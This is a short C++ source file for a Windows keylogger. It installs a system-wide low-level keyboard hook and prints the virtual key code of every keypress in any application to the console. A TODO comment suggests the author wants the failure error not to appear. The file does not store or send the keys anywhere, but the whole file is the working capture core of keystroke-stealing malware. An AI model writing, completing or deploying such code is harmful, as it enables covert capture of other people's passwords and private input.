#include "../include/keylogger.h"
#include <Windows.h>
#include <cstdio>

// Hook handler.
HHOOK hook;

// Contains data received by hook callback.
KBDLLHOOKSTRUCT kbdStruct;

LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0)
    {
        // If event is keystroke.
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // a key (non-system) is pressed.
            printf("Key Pressed: %lu\n", kbdStruct.vkCode);
        }
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}

void SetHook()
{
    // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, VKeyCodeCb, NULL, 0)))
    {
        //TODO: this shouldn't show an error
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(hook);
}

void getKeyStrokes() {
    // Set the hook
    SetHook();

    // While true, capture keystrokes.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){}
    ReleaseHook();
}